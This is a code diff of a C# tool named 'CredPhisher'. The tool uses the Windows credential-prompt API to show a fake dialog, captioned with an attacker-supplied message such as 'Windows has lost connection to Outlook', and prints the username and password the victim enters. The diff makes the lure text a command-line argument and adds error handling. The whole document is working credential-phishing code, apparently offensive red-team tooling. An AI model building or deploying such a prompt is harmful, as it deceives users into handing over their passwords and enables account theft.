@@ -3,16 +3,6 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 
-//-ToastTitle $ToastTitle
-//-ToastMessage $ToastMessage 
-//-Application $Application 
-//-CredBoxTitle $CredBoxTitle 
-//-CredBoxMessage $CredBoxMessage 
-//-ToastType $ToastType 
-//-VerifyCreds $VerifyCreds 
-//-EnableToastNotificationsIfDisabled $EnableToastNotificationsIfDisabled 
-//-HideProcesses  $HideProcesses
-
 namespace CredPhisher
 {
     class MainClass
@@ -52,11 +42,11 @@ namespace CredPhisher
             ref bool fSave,
             int flags);
 
-        public static void GetCredentialsVistaAndUp(string serverName, out NetworkCredential networkCredential)
+        public static void Collector(string message, out NetworkCredential networkCredential)
         {
             CREDUI_INFO credui = new CREDUI_INFO();
             string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-            credui.pszCaptionText = "Windows has lost connection to " + serverName;
+            credui.pszCaptionText = message;
             credui.pszMessageText = "Please enter the credentials for " + username;
             credui.cbSize = Marshal.SizeOf(credui);
             uint authPackage = 0;
@@ -71,7 +61,7 @@ namespace CredPhisher
                 out outCredBuffer,
                 out outCredSize,
                 ref save,
-                1 /* Generic */);
+                1);
 
             var usernameBuf = new StringBuilder(100);
             var passwordBuf = new StringBuilder(100);
@@ -98,13 +88,28 @@ namespace CredPhisher
             networkCredential = null;
         }
 
-        static void Main()
+        static void Main(string[] args)
         {
-            GetCredentialsVistaAndUp("Outlook", out NetworkCredential networkCredential);
-            Console.WriteLine("[+] Collected Credentials:\r\n" +
-                "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
-                "Password: " + networkCredential.Password);
-            Console.ReadKey();
+            if (args.Length == 0){
+                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook')");
+                Environment.Exit(1);
+            }
+            try
+            {
+                Collector(args[0], out NetworkCredential networkCredential);
+                Console.WriteLine("[+] Collected Credentials:\r\n" +
+                    "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
+                    "Password: " + networkCredential.Password);
+            }
+            catch (NullReferenceException) 
+            {
+                Console.WriteLine("[-] User exited prompt");
+            }
+            catch (Exception)
+            {
+                Console.WriteLine("[-] Looks like something went wrong...");
+            }
+            
         }
     }
 }
